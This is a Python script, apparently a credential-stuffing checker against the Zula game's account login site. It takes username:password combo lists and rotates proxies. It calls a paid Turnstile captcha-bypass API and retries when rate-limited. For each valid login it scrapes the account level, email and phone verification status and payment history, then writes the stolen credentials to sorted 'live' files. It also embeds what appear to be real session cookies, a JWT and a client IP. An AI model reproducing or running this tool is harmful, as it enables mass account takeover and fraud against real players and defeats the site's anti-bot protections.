import asyncio
import uuid,bs4
import random
import string
import json
import aiohttp
import time
from colorama import Fore, init

init(autoreset=True)

rapidheaders = {
    "x-rapidapi-key": "YOUR_API_KEY",
    "x-rapidapi-host": "turnstile-bypass-api1.p.rapidapi.com",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

def random_code():
    p1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    p2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    p3 = ''.join(random.choices(string.digits, k=10))
    p4 = ''.join(random.choices(string.digits, k=4))
    return f"{p1}-{p2}-{p3}-{p4}"

def baba_token(token, num_changes=5):
    token_list = list(token)
    pchars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    
    for _ in range(num_changes):
        indx = random.randint(0, len(token_list) - 1)
        nc = random.choice(pchars)

        while token_list[indx] == nc:
            nc = random.choice(pchars)
        token_list[indx] = nc

    return ''.join(token_list)

with open("proxy.txt", 'r', encoding="utf-8") as f:
    proxies = f.read().splitlines()

proxy_index = 0

def get_proxy():
    global proxy_index
    proxy = proxies[proxy_index]
    proxy_index = (proxy_index + 1) % len(proxies)
    return proxy

async def zulu(combo, session):
    try:
        user, pas = combo.strip().split(":")
        if not user or not pas:
            return 
    except:
        return



    headers = {"Origin": "https://hesap.zulaoyun.com", "Priority": "u=0, i", "Referer": "https://hesap.zulaoyun.com/",
               "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"99\", \"Opera GX\";v=\"113\", \"Chromium\";v=\"127\"",
               "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"",
               "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin",
               "Sec-Fetch-User": "?1", "Upgrade-Insecure-Requests": "1","cookie":"_gcl_au=1.1.935678524.1746351762; _fbp=fb.1.1746351763419.33488435148126579; ASP.NET_SessionId=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VyTmFtZSI6IlNvZnVvcXM1MyIsIkVtYWlsIjoiIiwiVXNlcklkIjoiN2YxOGJmODMtZWI2Yy00ZWM4LWJiZmQtMTYwY2ZkOWY3N2QzIiwiTmFtZSI6IlNvZnVvcXM1MyIsIkVtYWlsQ29uZmlybWVkIjoiRmFsc2UiLCJzdWIiOiJTb2Z1b3FzNTMiLCJqdGkiOiI0YzgxZGM0ZS03YjA0LTQzNmQtYjlkMi05YjdkN2JlNWMxZTMiLCJQdWJsaXNoZXJJZCI6IjEiLCJleHAiOjE3ODM2MDA1OTEsImlzcyI6Imh0dHBzOi8vaGVzYXAuenVsYW95dW4uY29tIiwiYXVkIjoiaHR0cHM6Ly9oZXNhcC56dWxhb3l1bi5jb20ifQ.9MM4HwSMN808xg6N6Lq_qskSNbb54lZch7ncVcMOyKk; .CurrentCountryCode=TR; .ClientIp=88.238.13.27; .UILanguage=2; .AspNetCore.Session=CfDJ8ERIdbTP73lFu0E25BOEyXrngyBImV4ZX%2BIX%2BvA9ARDq4s2MAu4n%2FMa7UX7y0Stdjthg%2BPSlOUMLGJ2W6B2pYOR62c%2BX6%2FRJcTEMEy0ToMu%2BB4fFRPjiCMoFMzpQHU6YnpJrXjzPldprGVf1rdxnRHME1ZwvYQjXN6ErtbsCgP9p; __cflb=0H28w2gxg3dkESzEdMxNicJdpGh8seSj6vQRYeHsmvc; .AspNetCore.Antiforgery.iwO7S7O7Dh4=CfDJ8ERIdbTP73lFu0E25BOEyXrOmqqF60nGRnk4-ibfQd6Mn1iv537UO78PVIlUwRftwMuyp96C5StoKV1B65O42jO-cp9VwpaMApezUfRwUCiXLPlMhpwhq86Ke89uHawBCZYfSQWzX_G8y7ArlRHTO14; _ga_FM6PLHSKCP=GS2.1.s1747765545$o6$g0$t1747765545$j60$l0$h0$dwhWeo_aedZNVbtr99ps7AM4tTtCpgkGjyQ; _ga=GA1.2.431099491.1746351762; _gid=GA1.2.1490419162.1747765546; _dc_gtm_UA-60166227-1=1; _dc_gtm_UA-60166227-3=1; _ga_X1VHRHNXTN=GS2.2.s1747765546$o5$g0$t1747765546$j60$l0$h0$dIdgnEg2bepWkKqT_5jjb5kRspJxOGAJXvg; cto_bundle=m_xZZl9iQjRLSnBOWlE1UTU1NkVINmtpSFpQR0ZleWVnNFgyJTJGTEpZSEc5REZkOVg3JTJGdmI0N0VBcGl6SnlIJTJGQTNrZjM4SDZQSXU5NlBZWVZOWElGRjVyendtSk1OYzg4V1pLNFB0blVlN3JKSEJTendSTnk5Wno2OHZHRHFpNjNRZ3g2cDRUYVVnaUxnNWtJczR3ZVBlMkdqMFBJYUZrNGxZSXpzMkVhZ3dFSkk2Q2lLUFdmNUVzaE1lWE8wVjNkdnYxSjFCVU9oTG5oNVZ4MGdrTkdBc2ZMTW5RJTNEJTNE",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0"}

    async with session.get("https://hesap.zulaoyun.com/zula-giris-yap", headers=headers) as response:
        login_data = await response.text()
        
        
    
    try:
        token = login_data.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
    except IndexError:
        print("token gelmedi")
        return await zulu(combo, session)

    async with session.post('https://turnstile-bypass-api1.p.rapidapi.com/check',
                           headers=rapidheaders, json={"url": "https://hesap.zulaoyun.com/zula-giris-yap",
                                                       "sitekey": "0x4AAAAAAAyOAhZopAtgo73i", "type": "cf"}) as captcha_response:
        cf = await captcha_response.json()
        captcha_token = cf.get('captcha_token')
        if captcha_token is None:
            print("none geldi")
            return await zulu(combo, session)
        print(captcha_token)

    datas = {"__RequestVerificationToken": token, "ReturnUrl": "", "UserName": user, "Password": pas,
             "cf_turnstile_response": captcha_token, "cf-turnstile-response": captcha_token, "RememberMe": False}
    
    async with session.post("https://hesap.zulaoyun.com/zula-giris-yap", headers=headers, allow_redirects=True, data=datas) as final_response:
        
       response_text = await final_response.text()
    if "Kullanıcı adı ya da şifre yanlış." in response_text:
        return print(Fore.RED + f"{combo} - Kullanıcı adı ya da şifre yanlış.")
    if int(final_response.status) in [403, 429]:
        return await zulu(combo, session)
    
    async with session.get('https://hesap.zulaoyun.com/profil/duzenle', headers=headers) as profile_response:
        profile_data = await profile_response.text()
        try:
            gsmdurum = profile_data.split('id="txtMobilePhoneVerify" placeholder="')[1].split('"')[0]
        except:
            gsmdurum = "sanırım yok"

    async with session.get("https://hesap.zulaoyun.com/profil/odeme-gecmisi", headers=headers) as payment_response:
        payment_data = await payment_response.text()
    async with session.get('https://hesap.zulaoyun.com/profil',headers=headers) as profile_response:
        profile_data = await profile_response.text()
        try:
         level = int(profile_data.replace(" ","").split('<divclass="progress-bar-text">')[1].split("</div>")[0].strip())
        except:
            level = 0

    soup = bs4.BeautifulSoup(payment_data, 'html.parser').find("div", {"payment-table table-responsive"})
    print(combo)
    try:
        tags = soup.find_all("tr", style="")
    except:
        print(f"hatalı {combo}")
        return
    try:
        mail = profile_data.split('id="txtEMailVerify" placeholder="')[1].split('"')[0]

    except:
        mail="bilmiyom"
    

    
    json_data = json.dumps({"username": user, "password": pas, "seviye": level,
                             "mailonay": mail,
                             "teldogr": gsmdurum,
                             "başarılıişlem": len(tags) - 1}, ensure_ascii=False, indent=4)

    fn = f"{int(level // 10) * 10}-{int(level // 10 + 1) * 10}live.txt"
    print(Fore.GREEN + f"Live var {combo}, capture için {fn} dosyasına bakın.")

    with open(fn, "a", encoding="utf-8") as file:
        file.write(json_data + "\n")

    await asyncio.sleep(random.uniform(0.5, 1.5))

async def run_tasks():
    combo = open("combo.txt", 'r', encoding="latin").read().splitlines()

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        chunk_size = 2
        for i in range(0, len(combo), chunk_size):
            tasks = [zulu(x, session) for x in combo[i:i + chunk_size]]
            await asyncio.gather(*tasks)



if __name__ == "__main__":
    asyncio.run(run_tasks())
